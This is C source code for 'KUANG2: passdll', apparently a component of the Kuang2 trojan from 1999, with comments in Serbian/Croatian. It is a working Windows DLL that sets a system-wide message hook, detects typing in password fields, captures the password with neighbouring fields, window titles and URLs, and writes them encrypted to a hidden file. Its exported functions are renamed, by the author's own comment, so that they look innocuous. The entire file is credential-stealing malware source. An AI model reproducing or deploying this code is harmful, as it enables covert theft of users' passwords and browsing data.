/***[ThuNderSoft]*************************************************************
								KUANG2: passdll
								   ver: 0.20
								úùÄÍ WEIRD ÍÄùú
*****************************************************************************/

/* HISTORY */
// ver 0.20 (19-may-1999): uzima sve Internet adrese koje trenutno postoje!
// ver 0.19 (19-may-1999): file size bug ispravljen
// ver 0.18 (25-feb-1999): konano i snima bez problema + sre”ivanje
// ver 0.15 (24-feb-1999): sigurno radi prepoznavanje passworda
// ver 0.10 (07-feb-1999): born code

#include <windows.h>
#include <strmem.h>
#include <tools.h>
#include <win95e.h>

// kada je ovo definisano onda se izlazni fajl kriptuje
#define CRYPT_ON

HINSTANCE hdll;
HHOOK hook;
char dllname[MAX_PATH+1]="d:\\weird";   // kompletna putanja + ime za fajl koji bele‚i podatke

char *buf, *b;


#define		CRLF	0x0A0D

// "-----\r\n"
char newtag[]={0xD2, 0xD2, 0xD2, 0xD2, 0xD2, 0xD0, 0xA0, 0x00};
char *pass;

static char *sMem = NULL;		// pointer na poetak zajednike memorije

// veliina zajednike memorije
#define		SHARED_MEMSIZE	5120
// skra†enice
#define		hlast		*(HWND*)sMem
#define		hactive		*(HWND*)(sMem+8)
#define		UNUTRA		*(BOOL*)(sMem+16)
// ubrzanja
HWND	_hlast;
HWND	_hactive;
BOOL	nasao;


/*
	LibMain
	-------
  ş Setuje zajedniku memoriju.
  ş Vra†a se TRUE ako je sve OK, inae FALSE. */

BOOL APIENTRY LibMain (HINSTANCE hd, DWORD fdwReason, LPVOID lpvReserved)
{
	HANDLE hMap=NULL;

	// inicijalizacija
	if (fdwReason==DLL_PROCESS_ATTACH) {
		hdll=hd;
		hMap = CreateFileMapping(
				(HANDLE) 0xFFFFFFFF,	// nije fajl!
				NULL, PAGE_READWRITE,	// atributi i read/write access
				0, SHARED_MEMSIZE,		// veliina mem bloka
				"Kdll2smmap");          // ime mapiranog objekta
		if (hMap==NULL) return FALSE;	// u sluaju gre„ke ne instaliraj DLL i iza”i

		// Uzmi pointer na file-mapiran zajedniki mem. blok
		sMem=(char *) MapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0);
		if (sMem==NULL) return FALSE;	// u sluaju gre„ke ne instaliraj DLL i iza”i
		hactive=hlast=NULL;				// uvek ih obri„i, za svaki poziv DLLa
		UNUTRA=FALSE;					// uvek resetuj
		pass=sMem+100;		// defini„i pass bufer (200 bajtova)
		b=sMem+300;			// defini„i b bufer (200 bajtova)
		buf=sMem+512;		// defini„i buf buffer (4.5 KB)
		return TRUE;
	}

	// deinicijalizacija
	if (fdwReason==DLL_PROCESS_DETACH) {
			UnmapViewOfFile(sMem);
			CloseHandle(hMap);
		return TRUE;
	}

	return TRUE;
}

/*
	EnumAll
	-------
  ş Enumeri„e child-ove prozora u potrazi za svim punim, jednolinijskim
	text poljima (edit polja) */

BOOL CALLBACK EnumAll(HWND hChild, LPARAM lParam)
{
	if (SendMessage(hChild, EM_GETLINECOUNT, 0, 0)==1) {	// izdvoji samo edit polja
		if (SendMessage(hChild, WM_GETTEXT, 100, (LPARAM) b)) { // izdvoji samo puna edit polja
			// tra‚i se odre”en prozor
			if (!lParam) {
				if (hChild==_hlast) strcopyF(pass, b);			// ako je ovo edit polje password onda ga kopiraj!
				else if (!strfind(buf, b))						// u suprotnom izdvoji ona polja koja do sada nisu bila
					straddFaddd(buf, b, CRLF);					// i zapi„i ih i dodaj novu liniju
			} else {
			// tra‚e se svi prozori
				char hoturl[]="://";            // karakteristina oznaka za url-ove
				if (strfind(b, hoturl)) {		// da li je u edit polju potencijalni url ?
					if (!strfind(buf, b)) {		// da, a da li je url mo‚da ve† naveden?
						nasao=TRUE;					// ne, prvi put se javlja
						straddFaddd(buf, b, CRLF);	// zapi„i url
					}
				}
			}
		}
	}
	return TRUE;	// idi na slede†i child, ako ga ima
}




/*
	Enum_wAll
	---------
  ş Enumeri„e sve prozora u potrazi za nekom internet adresom. */

BOOL CALLBACK Enum_wAll(HWND hWin, LPARAM lParam)
{
	nasao=FALSE;
	EnumChildWindows(hWin, EnumAll, 1);
	if (nasao) {
		// zapamti ime prozora u kome je na”ena adresa!
		pass[0]='[';
		GetWindowText(hWin, &pass[1], 100);		// uzmi ime aktivnog prozora
		straddFaddd(buf, pass, 0x0A0D5D);		// i njega zapi„i
		stradddF(buf, CRLF);					// odvoji red
	}
	return TRUE;	// idi na slede†i child, ako ga ima
}



/*
	doSaveMe
	--------
  ş	 Ovo je glavna f-ja koja po potrebi snima password u odgovaraju†i fajl. */

void doSaveMe()
{
	HANDLE hFile;
	char *f;
	DWORD procitano;
	unsigned int len, kkk;

	// Generi„i string buf

	if (UNUTRA) return;						// ako smo sluajno ve† unutra iza”i
	_hlast=hlast; _hactive=hactive;			// radi brzine
	if (!IsWindow(_hlast)) {				// ako prozor vi„e ne postoji (u sluaju CreateFile/GlobalAlloc gre„ke i nestanka tog prozora)
		_hlast=NULL;						// oznai da ne dolazi vi„e ovde
		return;								// i iza”i
	}
	UNUTRA=TRUE;							// oznai da smo unutra

	pass[0]=buf[0]=0;						// obri„i bafere
	EnumChildWindows(_hactive, EnumAll, 0); // enumeri„i prozor u kome je bilo pass polje - dok ne zavr„i„ nema dalje
	stradddF(buf, 0x3E);
	straddFaddd(buf, pass, 0x0A0D3C);		// dodaj i password
	pass[0]='[';
	GetWindowText(_hactive, &pass[1], 100); // uzmi ime aktivnog prozora
	straddFaddd(buf, pass, 0x0A0D5D);		// i njega zapi„i
	kkk=strlengthF(buf);					// preuzmi veliinu samo prvog dela
	straddF(buf, "===\r\n");                // oznaka za kraj prvog dela

	// sada prona”i sve web adrese u celom windowsu
	EnumWindows(Enum_wAll, 1);
	stradddF(buf, CRLF);					// odvoji red

	// snimi string buf ako nema ponavljanja

	// otvori/kreiraj fajl
	hFile=CreateFile(dllname, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_HIDDEN, NULL);
	if (hFile==INVALID_HANDLE_VALUE) goto diend3;

	len=GetFileSize(hFile, NULL);	// uzmi veliinu fajla
	if (len>=0x40000) {				// ako veliina fajla ode preko 256 KB
		SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
		SetEndOfFile(hFile);		// setuj da veliina bude 0
		len=0;
	}

	f=(char *) GlobalAlloc(GMEM_FIXED, len+strlengthF(buf)+16);
	if (f==NULL) goto diend2;

	ReadFile(hFile, f, len, &procitano, NULL);

	f[len]=0;	// zatvori bafer po„to nije zatvoren

#ifdef CRYPT_ON
	strcryptS(buf);						// kriptuj bufer (samo 1 krpitovanje!!!)
#endif

	// ovde se proverava da li passwordi ve† postoje.
	// Pa‚nja: ne proverava se ceo buf! ve† samo prvi deo (do '===')
	buf[kkk]=0;		// skrati prvi deo
	if (!strfind(f, buf)) {				// ako nije na”en...
		buf[kkk]=0xD3;					// vrati oznaku za prvi deo ('=');
		straddF(f, newtag);				// dodaj  7 bajtova za kasnije prepoznavanje novog zapisa
		straddF(f, buf);				// i dodaj passworde
		len=strlengthF(f);				// du‚ina (nema zadnje nule)
		SetFilePointer(hFile, 0, NULL, FILE_BEGIN); // idi na poetak fajla
		WriteFile(hFile, f, len, &procitano, NULL); // snimi sve
	}

	GlobalFree(f);
	hlast=NULL;					// oznai da je gotovo sa passwordom
diend2:
	CloseHandle(hFile);
diend3:
	UNUTRA=FALSE;				// nismo vi„e unutra
	return;
}



/*
	GetMsgProc
	----------
  ş Ovo je moja hook procedura. Ona proverava da li se trenutno kuca neki
	password. Ako se kuca, eka se da korisnik uradi ne„to drugo u tom prozoru
	koji sadr‚i pass polje: da pone da pi„e ne„to drugo, da klikne bilo gde
	drugde itd. */

LRESULT CALLBACK GetMsgProc(int code, WPARAM wParam, LPARAM lParam)
{
	char passchar;
	unsigned int msg=((MSG*)lParam)->message;	// preuzmi trenutnu poruku
	HWND htemp=((MSG*)lParam)->hwnd;			// preuzmi trenutni handle

	if (code==HC_ACTION) {
		_hlast=hlast;							// radi ve†e brzine !!!

		/* pritisnut taster */
		if (msg==WM_KEYDOWN) {
			if (((MSG*)lParam)->wParam==0x0D)	// ako je pritisnut ENTER generi„e se samo WM_KEYDOWN
				if (_hlast) doSaveMe();			// ako smo malo pre kucali password snimi
			goto izlaz; // radi ve†e brzine iza”i odmah ovde
		}

		/* otpu„ten taster */
		if (msg==WM_KEYUP) {
			passchar=SendMessage(htemp, EM_GETPASSWORDCHAR, 0, 0);
			if (passchar) {
				hlast=htemp;				// pass se trenutno kuca, zapamti to
				hactive=GetActiveWindow();	// prozor u kome je pass polje
			} else
				if (_hlast) doSaveMe();		// ako smo malo pre kucali password snimi ga
			goto izlaz; // radi ve†e brzine iza”i odmah ovde
		}

		/* pritisnut Alt taster */
		if (msg==WM_SYSKEYDOWN) {
			if (_hlast) doSaveMe();			// ako smo malo pre kucali password snimi
			goto izlaz; // radi ve†e brzine iza”i odmah ovde
		}

		/* otpu„teno levo dugme mi„a */
		if (msg==WM_LBUTTONUP) {
			if (_hlast) doSaveMe();			// ako smo malo pre kucali password snimi
			goto izlaz; // radi ve†e brzine iza”i odmah ovde
		}

		/* otpu„teno desno dugme mi„a */
		if (msg==WM_RBUTTONUP) {
			if (_hlast) doSaveMe();			// ako smo malo pre kucali password snimi
			goto izlaz; // radi ve†e brzine iza”i odmah ovde
		}
	}
izlaz:
	return CallNextHookEx(hook, code, wParam, lParam);
}



// EXTERN f-je:

/*
	InstallHook
	-----------
  ş Inicijalizacija.
  ş Ime sam promenio da ne bi bilo suvi„e oigledno. */

void GetSystemDescriptor(void)
{
	hook=SetWindowsHookEx(WH_GETMESSAGE, GetMsgProc, hdll, 0);
	return;
}

/*
	UnHook
	------
  ş Uklanja hook.
  ş Ime sam promenio da ne bude suvi„e oigledno. */

void FlushCache(void)
{
	UnhookWindowsHookEx(hook);
	return;
}
